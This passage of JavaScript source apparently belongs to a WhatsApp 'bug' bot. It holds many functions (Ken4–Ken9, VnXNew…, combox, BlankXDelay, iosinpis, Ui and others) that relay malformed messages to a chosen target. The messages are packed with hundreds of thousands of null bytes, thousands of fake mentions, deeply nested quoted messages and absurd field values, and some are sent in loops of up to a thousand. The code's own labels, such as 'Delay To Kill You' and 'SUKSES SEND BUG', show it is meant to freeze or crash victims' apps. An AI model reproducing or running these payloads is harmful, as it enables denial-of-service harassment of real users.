                    directPath: "/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c",
                    mimetype: 'image/jpeg',
                    caption: 'Kénón' + "\0".repeat(250000),
                    mediaKey: "gMU/MAFMpfewBPxf03l77UJ4BFniwIskJin1EAMj8e8=",
                    fileEncSha256: "qMxO75MnLoMaS/b/UuTRAtBNXh2H0HSVPVkJlkmSpgk=",
                    fileSha256: "RbwxheXko2h6rCjgkzKmD+l/wFliuC6SxtY3tbwSNzg=",
                    fileLength: '19897899',
                    mediaKeyTimestamp: "1778296099",
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, Ken4, { participant: { jid: target } });

    const Ken5 = {
        groupStatusMessageV2: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mp4",
                    fileSha256: "BAcpC1KGx40bu/FV78kBAafPjkkdj6DLVAx+B1g3avQ=",
                    fileLength: "109951162777600",
                    seconds: 1,
                    ptt: true,
                    mediaKey: "1KXHR1pvx2+y01K6Dewevx5FF5O5wfc5iE/oHIua2WY=",
                    fileEncSha256: "CggqdAt0fX+QHjKnfyX2OjO1OoUXLm5WlVlv6f5aGCU=",
                    directPath: "/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1774107510",
                    waveform: "EBAREicPEigjMkgwMDITDQ8QFBYkCwwMDAwIBAUCBScpMkNkUE1GTT1KVVk0VUVOWlUtWEk0X0o+Xh4XFxAIAQ==",
                    caption: "Kénón" + "\0".repeat(250000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')],
                        urlTrackingMap: {
                            urlTrackingMapElements: Array.from({ length: 100000 }, () => ({}))
                        }
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, Ken5, { participant: { jid: target } });

    const Ken6 = {
        groupStatusMessageV2: {
            message: {
                stickerMessage: {
                    url: 'https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true',
                    fileSha256: 'SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=',
                    fileEncSha256: 'l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=',
                    mediaKey: 'UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=',
                    mimetype: 'image/webp',
                    directPath: '/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c',
                    fileLength: '10610',
                    mediaKeyTimestamp: '1775044724',
                    stickerSentTs: '1775044724091',
                    contextInfo: {
                        mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')],
                        isForwarded: true,
                        forwardingScore: 250208,
                        businessMessageForwardInfo: { businessOwnerJid: '13135550002@s.whatsapp.net' },
                        participant: '13135550002@s.whatsapp.net',
                        remoteJid: 'status@broadcast',
                        quotedMessage: {
                            interactiveResponseMessage: {
                                body: { text: 'EARL', format: 'DEFAULT' },
                                nativeFlowResponseMessage: {
                                    buttons: [{ name: 'galaxy_message', buttonParamsJson: 'u0000'.repeat(250000) }]
                                }
                            }
                        }
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, Ken6, { participant: { jid: target } });

    let Ken7 = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    contextInfo: {
                        remoteJid: "EARL",
                        mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')]
                    },
                    body: { text: "The Days", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"Faiq","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\0".repeat(1000000)}"}}`,
                        version: 3
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, Ken7, { participant: { jid: target } });

    const Ken8 = [{ buttonId: 'EARL', buttonText: { displayText: '\0'.repeat(250000) }, type: 1 }];

    const Ken9 = {
        groupStatusMessageV2: {
            message: {
                buttonsMessage: {
                    contentText: '\x10'.repeat(250000),
                    footerText: '\0'.repeat(95000),
                    buttons: Ken8,
                    headerType: 1,
                    contextInfo: {
                        forwardingScore: 9741,
                        isForwarded: true,
                        quotedMessage: {
                            interactiveResponseMessage: {
                                contextInfo: {
                                    remoteJid: 'EARL',
                                    mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')]
                                },
                                body: { text: 'EARL', format: 'DEFAULT' },
                                nativeFlowResponseMessage: {
                                    name: 'call_permission_request',
                                    paramsJson: '\x10'.repeat(990000),
                                    version: 3
                                }
                            }
                        }
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, Ken9, { participant: { jid: target } });
}

async function VnXNewOnlyBulldo(sock, target) {
  const MsgNew = {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
            text: "\0".repeat(250000) + "\n".repeat(25000) + "\u0000".repeat(250000),
        }
      }
    }
  };

  try {
    await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
    console.log('message success to ${target}');
  } catch (e) {
    console.log("❌ Error Strike:", e);
  }
}

async function VnXNewDelayComboInpisToHard(sock, target) {
  const nameVnX = [
    "address_message", 
    "galaxy_message",
    "call_permission_request"
  ];

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Anti Ampos",
            format: 1
          },
          nativeFlowResponseMessage: {
            name: nameVnX[1], 
            paramsJson: `{"wa_flow_response_params":{"VnX Nihk":"${"\n".repeat(250000)}"}}`,
            version: 3
          }
        }
      }
    }
  }, { participant: { jid: target } });
    
  await sock.sendMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "VnX Is Here",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"VnX","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\u0000".repeat(1000000)}"}}`,
            version: 3
          }
        }
      }
    },
    contextInfo: { 
      remoteJid: "#VnXNew - By @Raffioffci5",
      mentionedJid: [
        '0@s.whatsapp.net',
        ...Array.from(
          { length: 2000 },
          () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net'
        )
      ]
    }
  }, { participant: { jid: target } });

  let vnxdelayinv = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Combo hard Delay To Kill You",
            format: 1
          },
          nativeFlowResponseMessage: {
            name: nameVnX[0],
            paramsJson: "\n".repeat(250000) + "\u0000".repeat(250000),
            version: 3
          }
        }
      }
    }
  };

  await sock.relayMessage(target, vnxdelayinv, { 
    participant: { jid: target } 
  });
}

async function DelayV1(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
sleep(1000);
}

async function DelayV2(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
}

async function delayreza(sock, target) {
  const rezaror = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Mak Lo Ewe Gxion",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\n".repeat(250000) + "\u0000".repeat(250000),
            version: 3
          }
        }
      }
    },
    contextInfo: { 
      remoteJid: "#VnXNew - By @Raffioffci5",
      mentionedJid: [
        '0@s.whatsapp.net',
        ...Array.from(
          { length: 2000 },
          () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net'
        )
      ]
    }
  };

  await sock.sendMessage(target, rezaror);
}

async function combox(sock, target) {
  for(let z = 0; z < 50; z++) {
    let msg = generateWAMessageFromContent(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
            }, 
            body: {
              text: "Rtr_Tzuko",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
              version: 3
            }
          }
        }
      }
    }, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id, participant: { jid:target } });
  }
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Bahlil Sayang U",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "🔨🕊"
        },
        contextInfo: {
          mentionedJid: [...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 5000000) + "91@s.whatsapp.net")],
          isForwarded: true,
          forwardingScore: 999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "1@newsletter",
            serverMessageId: 1,
            newsletterName: "Hooh"
          }
        }
      },
      status: "ytm",
      statusId: Date.now().toString(),
      timestamp: Date.now(),
      participants: []
    }
  }, { participant: { jid: target } });
  for (let i = 0; i < 50; i++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          protocolMessage: {
            type: 999,
            key: { remoteJid: target, fromMe: true, id: `${Date.now()}_${i}` },
            decryptionKey: Buffer.from("\u0000".repeat(50000))
          }
        },
        status: "RTR_F",
        statusId: `${Date.now()}_${i}`,
        timestamp: Date.now(),
        participants: []
      },
      messageContextInfo: {
        deviceListMetadata: {
          senderTimestamp: Date.now(),
          senderKey: Buffer.from("\u0000".repeat(30000))
        }
      }
    }, { participant: { jid: target } });
    const start = Date.now();
    let waste = 0;
    while (Date.now() - start < 50 + Math.random() * 100) {
      waste += Math.sqrt(Math.random() * 999999);
      new Array(100).fill().map(() => waste++);
    }
  }
  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
            mimetype: "image/jpeg",
            fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
            caption: "\u0000".repeat(50000) + "🩸".repeat(30000),
            fileLength: "99999999999999999999",
            height: -1,
            width: -1,
            mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
            fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
            directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1777621571",
            scansSidecar: "\u0000".repeat(10000),
            scanLengths: [Number.MAX_SAFE_INTEGER, Number.MAX_SAFE_INTEGER, Number.MAX_SAFE_INTEGER, Number.MAX_SAFE_INTEGER]
          }
        },
        status: "IMG_RTR",
        statusId: `IMG_${Date.now()}_${i}`,
        timestamp: Date.now(),
        participants: []
      }
    }, { participant: { jid: target } });
    const start2 = Date.now();
    let waste2 = 0;
    while (Date.now() - start2 < 50 + Math.random() * 100) {
      waste2 += Math.sqrt(Math.random() * 999999);
      new Array(100).fill().map(() => waste2++);
    }
  }
  for (let i = 0; i < 40; i++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: { text: "\u0000".repeat(100000) },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(500000),
              version: 3
            }
          }
        },
        status: "RTR_X",
        statusId: `${Date.now()}_${i}`,
        timestamp: Date.now(),
        participants: []
      }
    }, { participant: { jid: target } });
    const start3 = Date.now();
    let waste3 = 0;
    while (Date.now() - start3 < 50 + Math.random() * 100) {
      waste3 += Math.sqrt(Math.random() * 999999);
      new Array(100).fill().map(() => waste3++);
    }
  }
  for(let z = 0; z < 50; z++) {
    let msg2 = generateWAMessageFromContent(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
            }, 
            body: {
              text: "RTR_XUOI",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
              version: 3
            }
          }
        }
      }
    }, {});
    await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id, participant: { jid:target } });
  }
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "ꦾ".repeat(50000),
          matchedText: "ꦾ".repeat(50000),
          description: "ꦾ".repeat(50000),
          title: "ꦾ".repeat(50000),
          previewType: "NONE",
          jpegThumbnail: "RTR_XUOI",
          thumbnailDirectPath: "RTR_XUOI",
          thumbnailSha256: null,
          thumbnailEncSha256: null,
          mediaKey: null,
          mediaKeyTimestamp: "1743101489",
          thumbnailHeight: 641,
          thumbnailWidth: 640,
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
            ],
            remoteJid: "status@broadcast",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                botName: "ꦾ".repeat(50000),
                botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
                creatorName: "RTR_XUOI"
              }
            }
          }
        }
      }
    }
  }, {});
  for (let i = 0; i < 1000; i++) {
    try {
      const msg3 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "./mizuki", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1045000),
                version: 3
              },
              entryPointConversionSource: "galaxy_message"
            }
          }
        }
      }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
      });
      await sock.relayMessage(target, {
        groupStatusMessageV2: { message: msg3.message }
      }, { messageId: msg3.key.id, participant: { jid: target } });
      await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: {
            requestPaymentMessage: {
              body: { text: "./maklowh", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "review_and_pay",
                paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"null\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                version: 3
              }
            }
          }
        }
      }, { groupId: null, participant: { jid: target } });
      await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/v/t62.15575-24/545932757_821392374146649_3844921663899464720_n.enc?ccb=11-4&oh=01_Q5Aa3AGj0JnyULRqYe4gBwnvliNLa3fa7bD8ImS4lYXFNGCa0Q&oe=6946309C&_nc_sid=5e03e0&mms3=true",
              fileSha256: "fxxvVtTCmZ2Bpm/GEYpFF2GKUzJ8wWVrGY1mCmmh4I4=",
              fileEncSha256: "3xsWx0Y/1pNbWXWh/OG2mt4Ld0FEug25kyZ+lC+UbV4=",
              mediaKey: "uHEU7OghGYVW7IcWjhNlxPeZHNS0qfphvRUcy6+22wo=",
              mimetype: "image/webp",
              height: 64,
              width: 64,
              directPath: "/v/t62.15575-24/545932757_821392374146649_3844921663899464720_n.enc?ccb=11-4&oh=01_Q5Aa3AGj0JnyULRqYe4gBwnvliNLa3fa7bD8ImS4lYXFNGCa0Q&oe=6946309C&_nc_sid=5e03e0",
              fileLength: "13862",
              mediaKeyTimestamp: "1763628089",
              isAnimated: false
            }
          }
        }
      });
      await sleep(1000);
    } catch (error) {}
  }
  const hawojk = "𑇂𑆵𑆴𑆿".repeat(100000);
  let Majalengka = null;
  for(let i = 0; i < 800; i++) {
    Majalengka = {
      interactiveResponseMessage: {
        body: { text: hawojk.slice(0, 50000), format: 1 },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{"wa_flow_response_params":{"title":"${hawojk}"}}`,
          version: 3
        },
        contextInfo: { quotedMessage: Majalengka }
      }
    };
  }
  await sock.relayMessage(target, {
    interactiveResponseMessage: {
      body: { text: "#jukijuki", format: 1 },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{"wa_flow_response_params":{"title":"${hawojk}"}}`,
        version: 3
      },
      contextInfo: {
        quotedMessage: Majalengka,
        mentionedJid: Array.from({ length: 50000 }, () => 
          `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
        )
      }
    }
  }, { participant: { jid: target } });
  await sock.sendMessage(target, {
    text: "\u200b".repeat(500000),
    contextInfo: { quotedMessage: Majalengka }
  }).catch(()=>{});
  const msg4 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "Momok", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        }
      }
    }
  };
  const msgOpt = {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  };
  for (let i = 0; i < 5; i++) {
    const payload = generateWAMessageFromContent(target, msg4, msgOpt);
    await sock.relayMessage(target, {
      groupStatusMessageV2: { message: payload.message }
    }, { messageId: payload.key.id, participant: { jid: target } });
    await sleep(1000);
  }
  await sock.relayMessage("status@broadcast", {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });
}

async function BlankXDelay(sock, target) {
  try {
     
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    
    const xwar = {
      interactiveMessage: {
        body: { text: "Xkontol" },
        nativeFlowMessage: {
          buttons: Array.from({ length: 500000 }, () => ({}))
        }
      }
    };

    await sock.relayMessage(target, {
      groupStatusMessageV2: { message: xwar }
    }, { participant: { jid: target } });

    await sleep(1000);

    for (let i = 0; i < 100; i++) {
      await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: { text: "\x10" },
              contextInfo: {},
              nativeFlowMessage: {
                buttons: "[".repeat(500000)
              }
            }
          }
        }
      }, { participant: { jid: target } });

      await sleep(1000);
    }

    console.log(`[SUKSES SEND BUG${target}`);

  } catch (error) {
    console.error(`[Error: ${error.message}`);
  }
}

async function Dileymbut(sock, target) {
    const payload = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Dileymbut",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "cta_url",
                        paramsJson: JSON.stringify({ flow_cta: "\u0000".repeat(50000) }),
                        url: "https://mmg.whatsapp.net",
                        merchantUrl: "t.me/XylenCore",
                        version: 3
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, payload, { participant: { jid: target } });
}

async function VnXNewDelayHardInpis(sock, target) {
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
             body: {
              text: "VnX" + "\n"
            },
            nativeFlowMessage: {
              messageParamsJson: "[".repeat(10000),
              buttons: "\u0000".repeat(250000) + "\x10".repeat(250000)
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
}

async function VnXNewDenglayInpisCuy(sock, target) {
   const nameVnX = [
      "address_message", 
      "galaxy_message",
      "call_permission_request"  
   ];

   let vnxmbg = {
     groupStatusMessageV2: {
       message: {
         interactiveResponseMessage: {
           body: {
             text: "VnX Delay New Cuyy",
             format: "DEFAULT",
           },
           nativeFlowResponseMessage: {
             name: nameVnX[0], 
             paramsJson: "\x10".repeat(250000) + "\u0000".repeat(250000),
             version: 3,
           },
         },
       },
     },
   };

   await sock.relayMessage(target, vnxmbg, { 
     participant: { jid: target } 
   });
}

async function iosinpis(sock, target) {
const juki = {
  message: {
    locationMessage: {
      degreesLatitude: 21.1266,
       degreesLongitude: -11.8199,
      name: "Who? And Why?" + "𑇂𑆵𑆴𑆿".repeat(90000),
      url: "https://t.me/yatimloehk",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(90000),
            mediaType: "DEFAULT",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "#RTR_ZDIE"
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  }
};
  await sock.relayMessage("status@broadcast", juki.message, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function Ui(sock, target) {
  try {
    const a = {
      interactiveMessage: {
        header: { title: "Gxion.Where.Are.You" },
        body: {},
        footer: {
          text: "GXION IS HERE",
          hasMediaAttachment: true,
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mp4",
            fileSha256: "BAcpC1KGx40bu/FV78kBAafPjkkdj6DLVAx+B1g3avQ=",
            fileLength: "109951162777600",
            seconds: 1,
            ptt: true,
            mediaKey: "1KXHR1pvx2+y01K6Dewevx5FF5O5wfc5iE/oHIua2WY=",
            fileEncSha256: "CggqdAt0fX+QHjKnfyX2OjO1OoUXLm5WlVlv6f5aGCU=",
            directPath: "/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1774107510",
            waveform: "EBAREicPEigjMkgwMDITDQ8QFBYkCwwMDAwIBAUCBScpMkNkUE1GTT1KVVk0VUVOWlUtWEk0X0o+Xh4XFxAIAQ=="
          }
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "Buy Ambatron Goods",
                sections: [{
                  title: "",
                  rows: Array.from({ length: 4 }, () => ({
                    id: "\u0000".repeat(9000),
                    title: "\u0000".repeat(10000)
                  }))
                }]
              })
            },
            {
              name: "cta_call",
              buttonParamsJson: JSON.stringify({
                display_text: "ꦽ".repeat(150000),
                phone_number: "\u0000".repeat(5000)
              })
            }
          ]
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "REQUEST_LOCATION",
          quotedMessage: { conversation: "I'm fine𝗍" }
        }
      }
    };

    await sock.relayMessage(target, a, { participant: { jid: target } });

  } catch (err) {
    console.error("X Error:", err);
  }
}

async function VnxKayzenIsHere(sock, target, mention = true) {
  const vnxfcnih = generateWAMessageFromContent(target, { 
    imageMessage: { 
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true", 
      directPath: "/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c", 
      mimetype: 'image/jpeg', 
      caption: 'VnX', 
      mediaKey: "gMU/MAFMpfewBPxf03l77UJ4BFniwIskJin1EAMj8e8=", 
      fileEncSha256: "qMxO75MnLoMaS/b/UuTRAtBNXh2H0HSVPVkJlkmSpgk=", 
      fileSha256: "RbwxheXko2h6rCjgkzKmD+l/wFliuC6SxtY3tbwSNzg=", 
      fileLength: '19897899', 
      mediaKeyTimestamp: "1778296099", 
